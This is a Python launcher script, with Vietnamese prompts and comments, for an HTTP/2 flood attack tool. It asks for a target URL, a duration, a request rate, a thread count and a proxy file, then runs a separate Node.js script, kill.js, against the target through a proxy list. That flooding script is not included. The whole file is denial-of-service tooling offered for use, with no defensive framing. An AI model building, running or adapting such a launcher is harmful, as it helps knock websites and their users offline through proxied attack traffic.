import subprocess
import os
import sys

def clear_screen():
    # Xóa màn hình cho sạch sẽ
    os.system('cls' if os.name == 'nt' else 'clear')

def run_launcher():
    clear_screen()
    print("==========================================")
    print("   HTTP/2 FLOODER CONTROL (NODEJS RUNNER) ")
    print("==========================================")
    
    # 1. Nhập URL mục tiêu
    target = input("[+] Nhập URL mục tiêu: ").strip()
    if not target.startswith("http"):
        print("Lỗi: URL phải bắt đầu bằng http:// hoặc https://")
        input("\nNhấn Enter để thử lại...")
        return

    # 2. Nhập Thời gian
    duration = input("[+] Nhập thời gian chạy (giây): ").strip()
    if not duration.isdigit():
        print("Lỗi: Thời gian phải là một con số.")
        input("\nNhấn Enter để thử lại...")
        return

    # 3. Nhập Rate
    rate = input("[+] Nhập Rate (request/connection): ").strip()
    
    # 4. Nhập Threads
    threads = input("[+] Nhập số Threads (luồng): ").strip()

    # 5. Lựa chọn Proxy
    print("\n--- CHỌN NGUỒN PROXY ---")
    print("1. Sử dụng proxy.txt")
    print("2. Sử dụng live.txt")
    choice = input("[+] Nhập lựa chọn (1 hoặc 2): ").strip()

    if choice == '1':
        proxy_file = "proxy.txt"
    elif choice == '2':
        proxy_file = "live.txt"
    else:
        print("Lỗi: Lựa chọn không hợp lệ!")
        input("\nNhấn Enter để thử lại...")
        return

    # Kiểm tra các file cần thiết trước khi chạy
    if not os.path.exists(proxy_file):
        print(f"[-] Lỗi: Không tìm thấy file '{proxy_file}' trong thư mục!")
        input("\nNhấn Enter để thoát...")
        return
    
    if not os.path.exists("kill.js"):
        print("[-] Lỗi: Không tìm thấy file 'kill.js' trong thư mục!")
        input("\nNhấn Enter để thoát...")
        return

    # Lệnh thực thi: node kill.js <target> <time> <rate> <thread> <proxyfile>
    command = [
        "node", 
        "kill.js", 
        target, 
        duration, 
        rate, 
        threads, 
        proxy_file
    ]

    print("\n" + "-"*40)
    print(f"[*] Đang khởi chạy Node.js với {threads} luồng...")
    print(f"[*] Proxy sử dụng: {proxy_file}")
    print(f"[*] Mục tiêu: {target}")
    print("-"*40 + "\n")

    try:
        # Thực thi file kill.js
        subprocess.run(command, check=True)
    except FileNotFoundError:
        print("Lỗi: Máy tính chưa cài đặt Node.js. Hãy cài Node.js để chạy file .js")
    except KeyboardInterrupt:
        print("\n[!] Đã dừng công cụ bởi người dùng.")
    except Exception as e:
        print(f"Lỗi phát sinh: {e}")

if __name__ == "__main__":
    while True:
        run_launcher()
        cont = input("\nBạn có muốn thực hiện lượt mới không? (y/n): ").lower()
        if cont != 'y':
            break
